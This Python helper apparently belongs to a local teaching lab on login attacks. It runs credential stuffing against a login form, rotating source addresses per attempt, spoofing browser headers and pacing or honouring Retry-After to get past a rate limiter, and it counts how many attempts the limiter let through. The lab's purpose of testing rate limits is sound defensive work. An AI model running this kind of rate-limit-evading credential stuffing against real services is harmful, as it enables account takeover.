"""
Shared helper for the Chapter 2 login attacks. Importing it runs the localhost guard
(labclient imports labnet), so every attack that uses it is local-only.

The metric for a rate-limiting attack is NOT "did I guess the password". It is "how many of
my attempts did the limiter let reach the login logic". So `succeeded` counts every attempt
that came back as anything other than 429 (rate limited): a 302/200 (valid pair, logged in)
or a 401 (wrong password, but the limiter still spent the work). That is what a rate limit is
for: it caps attempts regardless of whether they would have worked.
"""

import collections
import json
import time

import browsers
from labclient import BASE_URL, LabClient, csrf_of


def _ua():
    return browsers.headers_for(("chrome", 153, "windows"), "typed", BASE_URL)


def login_attempt(client, email, password, ip, csrf):
    """One POST /login. Returns the status code."""
    r = client.post("/login", data={"csrf": csrf, "email": email, "password": password, "next": "/account"},
                    headers=_ua(), ip=ip)
    return r.status_code


def stuff(name, pairs, next_ip, xff=None, pace=0.0, respect_retry=False):
    """Try each (email, password) in `pairs`, one source address per attempt from next_ip(i).

    pace            seconds to sleep between attempts (a patient attacker)
    respect_retry   when a 429 comes back, sleep its Retry-After instead of counting it done
    Returns the summary dict (printed by finish()).
    """
    client = LabClient(f"bot:{name}")
    # One GET to mint a session + CSRF; the token is good for the whole session.
    r = client.get("/login", headers=_ua(), ip=next_ip(0))
    csrf = csrf_of(r.text)
    statuses, got_in, allowed = collections.Counter(), 0, 0
    i = 0
    while i < len(pairs):
        email, password = pairs[i]
        code = login_attempt(client, email, password, next_ip(i), csrf)
        statuses[code] += 1
        if code == 429:
            if respect_retry:
                ra = int(client.last.headers.get("Retry-After", "1") or 1)
                time.sleep(min(ra, 5))
                continue               # retry the same pair; do not advance
        else:
            allowed += 1
            if code in (302, 303):
                got_in += 1
        i += 1
        if pace:
            time.sleep(pace)
    return {"name": name, "attempted": len(pairs), "succeeded": allowed, "logged_in": got_in,
            "statuses": dict(statuses)}


def finish(out):
    print(f"{out['name']}: {out['succeeded']}/{out['attempted']} attempts reached login "
          f"({out.get('logged_in', 0)} logged in)   statuses {out['statuses']}")
    print(json.dumps(out))
